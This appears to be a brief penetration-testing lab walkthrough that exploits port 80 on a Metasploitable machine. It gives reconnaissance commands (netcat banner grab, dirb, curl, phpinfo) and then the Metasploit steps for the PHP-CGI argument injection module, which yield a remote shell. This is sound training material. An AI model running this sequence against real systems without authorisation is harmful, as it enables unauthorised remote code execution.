*Exploiting port 80 (Apache)


Through port scan we know that port number 80 is opened. Let us to banner grabbing using netcat and http.


Command:
--------

# nc 192.168.1.4 80
  GET / HTTP/1.0

# http 192.168.0.109


directory bruteforce
------------------------
# dirb http://192.168.1.4

# curl -I http://192.168.0.109

 - Try to gather some more information by accessing the web page (type the Metasploitable IP address and /phpinfo.php in the browser)


Command:
--------
# http://192.168.1.4/phpinfo.php

 - Apache+ PHP, CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability. And exploit is available in Metasploit


Reference:
https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection


# searchsploit apache | grep 5.4.2


*Exploitation using MSF

I got the php version is 5.2.4.

search the php_cgi 5.2.4.

# searchsploit php 5.2.4
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution 



# msfconsole
# search php_cgi
# exploit/multi/http/php_cgi_arg_injection
# show options
# set RHOSTS 192.168.1.4
# exploit
# sysinfo
# ls

 - Finally!! Exploit has been executed successfully and we got the shell of Metasploitable





